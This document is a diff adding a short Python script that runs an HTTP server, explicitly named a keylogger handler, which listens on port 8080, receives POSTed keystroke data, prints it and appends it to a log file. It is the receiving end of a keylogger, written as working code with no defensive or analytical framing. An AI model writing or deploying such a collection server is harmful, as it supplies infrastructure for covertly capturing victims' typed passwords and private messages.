@@ -1,0 +1,22 @@
+from http.server import BaseHTTPRequestHandler, HTTPServer
+
+class KeyloggerHandler(BaseHTTPRequestHandler):
+
+    def do_POST(self):
+        content_length = int(self.headers['Content-Length'])
+        data = self.rfile.read(content_length)
+
+        print("[KEYLOG RECEIVED]:", data.decode())
+
+        with open("logs.txt", "a") as f:
+            f.write(data.decode() + "\n")
+
+        self.send_response(200)
+        self.end_headers()
+
+
+server = HTTPServer(("0.0.0.0", 8080), KeyloggerHandler)
+
+print("Listening for keylogs on port 8080...")
+
+server.serve_forever()
